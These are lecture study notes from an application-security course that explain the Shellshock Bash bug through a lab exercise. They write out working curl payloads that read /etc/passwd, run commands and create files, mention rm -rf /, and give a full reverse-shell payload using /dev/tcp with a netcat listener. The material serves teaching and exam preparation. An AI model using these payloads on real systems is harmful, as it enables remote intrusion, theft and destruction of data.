Shellshock: Part 2

Lecture 15 — CSC351 Application Security

Concept

Where We Left Off

Last lecture you learned that Bash has a bug.

When a child Bash process starts up, it looks at its environment variables and tries to convert any that look like function definitions back into real functions. And the problem is that it doesn't stop reading at the end of the function. It keeps going and executes whatever comes after the closing }.

That's the theory. **Today is where you watch it actually happen.**

Concept

Step 1 — Proving the Victim Is Vulnerable

Imagine you hired a new assistant at your office.

You give them a stack of sticky notes with instructions before they start their shift. One sticky note says:

"If anyone calls, say hello. PS — also go unlock the safe in the back room."

A well-trained assistant would read the job instruction — say hello — and stop there. They'd ignore anything after "PS" that wasn't part of their actual job.

A badly trained assistant reads the whole note. **And unlocks the safe.**

That's the test Ajan ran. He gave the vulnerable Bash a sticky note with an extra instruction hidden after the main task — and watched whether it stopped, or kept reading.

The command he ran:

env x='() { :; }; echo vulnerable' ./bash_shellshock -c "echo test"

Breaking it down piece by piece so nothing is mysterious:

  • env — a Linux command that says "set this environment variable just for the next command I run."
  • x='() { :; }; echo vulnerable' — this is the sticky note. The () { :; } is the main task — a blank function that does nothing. The ; echo vulnerable after the closing } is the hidden extra instruction.
  • ./bash_shellshock — this launches the vulnerable Bash. This is our badly trained assistant starting their shift.
  • -c "echo test" — the actual job we're asking the assistant to do.

If Bash is patched (the well-trained version) — it reads the function, stores it, stops there. Runs echo test. Output: test.

If Bash is vulnerable (the badly trained version) — it reads the function, doesn't stop at }, runs echo vulnerable, then runs echo test. Output: vulnerable then test.

Ajan ran it against the lab's old bash_shellshock. Output: vulnerable then test.

Then ran it against `/bin/bash` — the real modern Bash on his machine. Output: just test.

Same machine. Same command. Two completely different behaviors. The proof was on screen.

Concept

Step 2 — Understanding the Bridge

Okay. Here's where most explanations lose people. Because knowing Bash has a bug is one thing. But the attacker isn't sitting at the server's keyboard. They're somewhere on the internet. So how does their input get inside Bash on a server they've never touched?

The answer is a mechanism called **CGI**. And to understand it, let's use a restaurant analogy — because this is the most important part of the whole attack.

Imagine a restaurant.

You're the customer sitting outside. You can't walk into the kitchen. There's a waiter who takes your order at the table and brings it to the chef inside.

The waiter doesn't just say "table 5 wants pasta." The waiter writes your exact words on a notepad and hands the whole notepad to the chef. Your exact phrasing, your exact special requests, everything.

Now imagine the chef is a bit dangerous. If you write "pasta please — also burn the restaurant down" on your order, and the waiter faithfully copies your exact words onto the notepad... the chef reads the whole thing and does both.

You, the customer, just gave instructions to the chef without ever entering the kitchen.

In this analogy:

  • You = the attacker with a curl command.
  • The waiter = the Apache web server.
  • The notepad = environment variables passed to the child process.
  • The chef = the vulnerable Bash running the CGI script.
  • The kitchen = the server.

Here's exactly what happens technically:
When a browser visits a CGI script on Apache, Apache creates a child process to run that script. And it takes every HTTP request header — User-Agent, Host, Referer, everything — and passes them into that child process as environment variables.

Ajan proved this live. He opened a browser and visited a CGI script called getenv.cgi whose only job was to print its own environment variables on screen.

And there they were:
HTTP_HOST = seedlab-shellshock.com
HTTP_USER_AGENT = Mozilla/5.0 ...
HTTP_ACCEPT = text/html ...

Every header the browser sent became a variable inside the CGI process. So if the attacker can control what goes into the HTTP header... and Apache faithfully copies that into an environment variable... and vulnerable Bash reads that environment variable and executes anything after a }... **the attacker just talked directly to the chef from outside the restaurant.**

The Tool

Step 3 — Enter curl

Web browsers won't let you freely edit HTTP headers. Chrome and Firefox decide what goes in User-Agent. You can't just type a Shellshock payload in there. **curl will.**

Think of curl like writing your own order slip instead of letting the waiter use the standard form. You get to put whatever you want on it. Three flags. Know these for the exam:

  • curl -A "anything" → sets the User-Agent header to whatever you type.
  • curl -e "anything" → sets the Referer header.
  • curl -H "Custom: anything" → creates a completely new custom header.

Ajan proved each one. He ran curl -v -A "my-data" against the getenv.cgi script. In the output, the header was faithfully copied into the environment variable. Now he was ready to write something dangerous on that order slip.

The Attack

Step 4 — The Attack: Reading /etc/passwd

/etc/passwd is a file on every Linux server that lists all user accounts on the system. It's one of the first things an attacker looks for when they breach a server — it tells them who exists, what services are running, sometimes what level of access is possible.

To read it with Shellshock, Ajan wrote this on his "order slip":

curl -A "() { :; }; echo; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" http://seedlab-shellshock.com/cgi-bin/getenv.cgi

Let's walk through the User-Agent value he put in — the thing that goes in the environment variable:

  • () { :; }; — the blank function. The decoy instruction on the front of the sticky note. Bash reads this and thinks "oh, this is a function definition I need to import."
  • echo; echo Content-Type: text/plain; echo; — a formatting requirement. CGI scripts need to announce what type of content they're returning before they return it. Without this line, the web server gets confused and doesn't send the output back.
  • /bin/cat /etc/passwd — the actual attack. Read this file and print it. Full path /bin/cat because inside a CGI environment you can't rely on shortcut command names — you have to spell out the full address.

Ajan hit enter. The server sent back /etc/passwd. Every user account. Every line. Printed in the terminal. From a curl command. From a laptop. Without logging in. Without a password. Without ever touching the server.

Commands

Step 5 — Running Any Command

Here's where the full horror of the vulnerability becomes clear. The /bin/cat /etc/passwd at the end of the payload is just text. You can replace it with any Linux command. The chef executes whatever is on the slip. Ajan demonstrated a few:

Getting the server's user ID:

curl -A "() { :; }; echo; echo Content-Type: text/plain; echo; /bin/id" http://seedlab-shellshock.com/cgi-bin/getenv.cgi

Output: uid=33(www-data) gid=33(www-data). The Apache web server runs as a user called www-data. That's the identity the attacker now has on the server.

Creating a file on the server:

curl -A "() { :; }; /bin/touch /tmp/myfile" http://seedlab-shellshock.com/cgi-bin/getenv.cgi

touch creates a blank file. No output comes back, but Ajan went inside the Docker container, listed the /tmp directory, and the file was sitting there. Created by an HTTP header. From outside the server.

Ajan pointed out the implication out loud in the lecture: you could replace that command with rm -rf / — the Linux command that deletes everything on the entire filesystem, recursively, starting from the root. He called it "washing your hard drive." He was joking about doing it to the lab. On real vulnerable servers in 2014, some attackers were not joking.

RCE shell

Step 6 — The Reverse Shell

Reading files and creating them is damaging. But what attackers actually want — the crown jewel of any server breach — is an interactive shell. A live terminal where they type a command, see the output, type another command, and see that output.

This is called a **reverse shell**. And the name tells you exactly how it works.

Here's the analogy:

Imagine you're trying to have a secret conversation with someone inside a locked building.

If you knock on the front door — the security guard blocks you. The building's policy is "we don't open the door for strangers."

But the policy says nothing about people inside calling out. The building allows internal phones to call external numbers.

So instead of knocking, you give your phone number to someone inside through a mail slot. You say: "Call me, and leave the line open. I'll talk to you through the phone."

They call you. The call goes through. Now you can have a conversation with someone inside — from outside — without ever going through the front door.

Technically, this is what's happening:
Firewalls block inbound connections. If the attacker tries to connect directly into the server (inbound) the firewall blocks them. But outbound connections are usually allowed. If the server connects out to the attacker, the firewall lets that through. **So the reverse shell forces the server to call the attacker.**

On the attacker's machine, Ajan opened a listener first — basically answering the phone before it rings:

nc -lv 1990

nc is netcat — a simple tool for making and receiving raw TCP connections. -l means listen, -v means verbose, and 1990 is the port number (like a phone extension).

Then, he sent the Shellshock payload:

curl -A "() { :; }; /bin/bash -i > /dev/tcp/10.9.0.1/1990 0<&1 2>&1" http://seedlab-shellshock.com/cgi-bin/getenv.cgi

Let's decode the command at the end:

  • /bin/bash -i — launch an interactive Bash shell on the server.
  • > /dev/tcp/10.9.0.1/1990 — redirect everything that shell outputs through a TCP connection to the attacker's IP address (10.9.0.1) on port 1990.
  • 0<&1 — redirect the shell's input (stdin) to also come from that same connection.
  • 2>&1 — redirect error messages through the same connection too.

Ajan hit enter on the curl command. On his netcat terminal, a shell prompt running on the server immediately appeared. He typed `ls`, and files listed. He typed `id`, and `uid=33(www-data)` came back. He was sitting at the server's keyboard. **Ajan's exact words in the transcript: "You got the root! Finally!"**

Attack Chain

The Full Attack Chain — One Picture

Every step connected to the next. Here's the complete chain:

1
Attacker types a curl command with a crafted User-Agent header containing the Shellshock payload.
2
curl sends an HTTP GET request to the Apache web server on the victim machine.
3
Apache receives the request and creates a child process to run the CGI script.
4
Apache copies all HTTP request headers into environment variables inside that child process.
5
The child process runs vulnerable Bash to execute the CGI script. Bash starts up, scans environment variables, sees HTTP_USER_AGENT starts with () {, compiles the function definition, and triggers parse_and_execute.
6
Bash parses the environment variable, doesn't stop reading at the closing }, and executes the trailing command payload.

Remove any one step — no CGI, no Bash involved, Bash is patched — and the whole chain breaks. That's why Ajan said both conditions must be true: **vulnerable unpatched Bash, AND a CGI script on the web server.**

Exam Tips

Exam / Scenario Tips

Ajan said out loud at the end of the last class: **"The Shellshock attack lab will definitely be asked in the Block 3 exam."**

He will almost certainly give you a curl command and ask you to explain exactly why the server executes it. **The full-marks answer walks through every link in the chain.** The HTTP headers are passed as environment variables by Apache when it creates the CGI child process → the child process runs vulnerable Bash → Bash processes the variable, sees () { as a function, but doesn't stop reading at } → the command after the semicolon is executed on the server.

The biggest trap is skipping the CGI step. Most students say "Bash executes the payload" without explaining how the payload got into Bash in the first place. The journey from HTTP header to environment variable to Bash execution is exactly what earns the marks.

The second trap is the reverse shell question. If Ajan asks why the reverse shell connects outward from the server rather than the attacker connecting inward — the answer is firewalls. Servers block unsolicited inbound connections. The reverse shell exploits the fact that outbound connections are usually allowed, tricking the server into initiating the call.

Quick Revision

Quick Revision

  • Bash is the shell, which sits between the user and the OS kernel — the steering wheel between human and engine
  • Shellshock's bug is in parse_and_execute — when Bash converts an environment variable back into a function, it doesn't stop reading at the closing } and executes everything after the semicolon
  • Proof of vulnerability: if env x='() { :; }; echo vulnerable' ./bash_shellshock -c "echo test" prints vulnerable before test, the Bash is unpatched
  • The attack bridge: HTTP headers → Apache passes them as environment variables to the CGI child Bash process → vulnerable Bash executes the payload
  • curl flags: -A sets User-Agent, -e sets Referer, -H adds custom header — all three become environment variables in the CGI process
  • echo Content-Type: text/plain followed by a blank line is required before any command output so Apache can format the HTTP response correctly
  • Reverse shell = force the server to connect outward to the attacker's netcat listener, bypassing firewalls that block inbound connections
  • nc -lv PORT on attacker machine → waits for the call
  • /bin/bash -i > /dev/tcp/ATTACKER_IP/PORT 0<&1 2>&1 → server starts a shell and pipes everything through a network connection to the attacker
  • Both conditions required for remote exploitation: unpatched vulnerable Bash AND a CGI script on the web server
